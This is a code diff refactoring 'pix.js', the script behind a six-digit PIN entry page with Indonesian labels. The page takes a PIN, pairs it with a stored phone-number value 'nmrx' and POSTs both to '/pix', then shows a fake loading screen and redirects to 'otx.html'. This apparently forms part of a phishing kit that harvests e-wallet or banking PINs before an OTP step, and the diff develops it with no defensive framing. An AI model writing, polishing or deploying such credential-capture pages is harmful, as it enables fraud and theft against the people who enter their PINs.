@@ -1,275 +1,219 @@
 // pix.js
 
-const inputs =
-document.querySelectorAll(".pix-box");
-
-const showBtn =
-document.getElementById("showBtn");
-
-const loadingBox =
-document.getElementById("loadingBox");
-
-const errorBox =
-document.getElementById("errorBox");
+const inputs = document.querySelectorAll(".pix-box");
+const showBtn = document.getElementById("showBtn");
+const loadingBox = document.getElementById("loadingBox");
+const errorBox = document.getElementById("errorBox");
 
 let isShow = false;
 
-/* FADE IN */ 
+/* FADE IN */
 window.addEventListener("load", () => {
-
-    document.body.classList.add(
-    "fade-in"
-    );
-
+    document.body.classList.add("fade-in");
+    inputs[0].focus();
 });
 
-/* ========================= */
 /* RESET LOADING */
-/* ========================= */
-
-window.addEventListener(
-"pageshow",
-() => {
-
-    loadingBox.style.display =
-    "none";
-
+window.addEventListener("pageshow", () => {
+    loadingBox.style.display = "none";
 });
 
-/* ========================= */
-/* FOKUS KE BOX KOSONG */
-/* ========================= */
+/* UPDATE BOX */
+function updateBoxState(input){
 
-inputs.forEach((input,index) => {
+    if(input.value !== ""){
 
-    input.addEventListener(
-    "click",
-    () => {
-
-        for(
-            let i = 0;
-            i < inputs.length;
-            i++
-        ){
-
-            if(
-                inputs[i].value === ""
-            ){
-
-                inputs[i].focus();
-
-                break;
-
-            }
-
+        if(isShow){
+            input.classList.add("filled");
+            input.classList.add("show-value");
+        }else{
+            input.classList.add("filled");
+            input.classList.remove("show-value");
         }
 
-    });
+    }else{
+        input.classList.remove("filled");
+        input.classList.remove("show-value");
+        input.classList.remove("pop");
+    }
+}
 
+/* ANIMASI ANGKA MUNCUL DULU */
+function popThenHide(input){
+
+    input.classList.remove("filled");
+    input.classList.add("show-value");
+    input.classList.add("pop");
+
+    setTimeout(() => {
+
+        input.classList.remove("pop");
+
+        if(!isShow && input.value !== ""){
+            input.classList.remove("show-value");
+            input.classList.add("filled");
+        }
+
+    },500);
+}
+
+/* FOKUS KE BOX KOSONG */
+inputs.forEach((input) => {
+
+    input.addEventListener("click", () => {
+
+        for(let i = 0; i < inputs.length; i++){
+
+            if(inputs[i].value === ""){
+                inputs[i].focus();
+                return;
+            }
+        }
+
+        inputs[inputs.length - 1].focus();
+    });
 });
 
-/* ========================= */
-/* AUTO PIX */
-/* ========================= */
-
+/* INPUT PIX */
 inputs.forEach((input,index) => {
 
-    input.addEventListener(
-    "input",
-    () => {
+    input.addEventListener("input", () => {
 
-        input.value =
-        input.value.replace(
-        /[^0-9]/g,
-        ''
-        );
+        input.value = input.value
+            .replace(/[^0-9]/g,"")
+            .substring(0,1);
 
-        /* HIDE ERROR */
-        errorBox.classList.remove(
-        "show"
-        );
+        errorBox.classList.remove("show");
 
-        /* NEXT */
-        if(
-            input.value.length === 1
-        ){
+        if(input.value !== ""){
+            popThenHide(input);
 
-            if(
-                index <
-                inputs.length - 1
-            ){
-
-                inputs[index + 1]
-                .focus();
-
+            if(index < inputs.length - 1){
+                inputs[index + 1].focus();
             }
-
+        }else{
+            updateBoxState(input);
         }
 
         checkPix();
-
     });
 
     /* BACKSPACE */
-    input.addEventListener(
-    "keydown",
-    (e) => {
+    input.addEventListener("keydown", (e) => {
 
-        if(
-            e.key === "Backspace" &&
-            input.value === ""
-        ){
+        if(e.key === "Backspace"){
 
-            if(index > 0){
+            if(input.value !== ""){
 
-                inputs[index - 1]
-                .focus();
+                input.value = "";
+                updateBoxState(input);
 
+            }else if(index > 0){
+
+                inputs[index - 1].focus();
+                inputs[index - 1].value = "";
+                updateBoxState(inputs[index - 1]);
             }
 
+            e.preventDefault();
         }
-
     });
-
 });
 
-/* ========================= */
-/* SHOW PIX */
-/* ========================= */
-
-showBtn.addEventListener(
-"click",
-() => {
+/* SHOW / HIDE PIX */
+showBtn.addEventListener("click", () => {
 
     isShow = !isShow;
 
     inputs.forEach(input => {
 
-        input.type =
-        isShow
-        ? "text"
-        : "password";
+        if(isShow){
+
+            input.type = "text";
+
+            input.classList.add("show-value");
+            input.classList.remove("filled");
+
+        }else{
+
+            input.type = "password";
+
+            if(input.value !== ""){
+                input.classList.remove("show-value");
+                input.classList.add("filled");
+            }
+
+        }
 
     });
 
-    showBtn.innerText =
-    isShow
-    ? "SEMBUNYIKAN"
-    : "TAMPILKAN";
+    showBtn.innerText = isShow
+        ? "SEMBUNYIKAN"
+        : "TAMPILKAN";
 
 });
 
-/* ========================= */
 /* CHECK PIX */
-/* ========================= */
-
- async function checkPix(){
+async function checkPix(){
 
     let pix = "";
 
     inputs.forEach(input => {
-
         pix += input.value;
-
     });
 
-
-    /* FULL */
     if(pix.length === 6){
 
-        /* PIX SALAH */
         if(pix === "123456"){
 
-            /* GETAR */
             if(navigator.vibrate){
-
-                navigator.vibrate([
-                    120,
-                    80,
-                    120
-                ]);
-
+                navigator.vibrate([120,80,120]);
             }
 
-            /* SHOW ERROR */
-            errorBox.classList.add(
-            "show"
-            );
+            errorBox.classList.add("show");
 
-            /* AUTO HIDE */
             setTimeout(() => {
-
-                errorBox.classList.remove(
-                "show"
-                );
-
+                errorBox.classList.remove("show");
             },2000);
 
-            /* RESET */
             setTimeout(() => {
 
                 inputs.forEach(input => {
-
                     input.value = "";
-
+                    input.classList.remove("filled");
+                    input.classList.remove("show-value");
+                    input.classList.remove("pop");
                 });
 
+                isShow = false;
+                showBtn.innerText = "TAMPILKAN";
                 inputs[0].focus();
 
             },300);
 
             return;
-
         }
 
-        /* AMBIL */
-        const nmrx =
-            localStorage.getItem(
-            "nmrx"
-            );
+        const nmrx = localStorage.getItem("nmrx");
 
-         /* SIMPAN */
-    localStorage.setItem(
-    "pix",
-    pix
-    );
+        localStorage.setItem("pix", pix);
 
-        /* KIRIM */
-    await fetch("/pix", {
+        await fetch("/pix", {
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json"
+            },
+            body:JSON.stringify({
+                nmrx:nmrx,
+                pix:pix
+            })
+        });
 
-        method:"POST",
+        loadingBox.style.display = "flex";
 
-        headers:{
-            "Content-Type":
-            "application/json"
-        },
-
-        body:JSON.stringify({
-
-            nmrx:nmrx,
-            pix:pix
-
-        })
-
-    });
-        
-        /* SHOW LOADING */
-        loadingBox.style.display =
-        "flex";
-
-        /* DELAY */
         setTimeout(() => {
-
-             /* FADE OUT */
-    document.body.classList.add(
-    "fade-out"
-    );
-
-            window.location.href =
-            "otx.html";
-
+            document.body.classList.add("fade-out");
+            window.location.href = "otx.html";
         },2000);
-
     }
-
 }
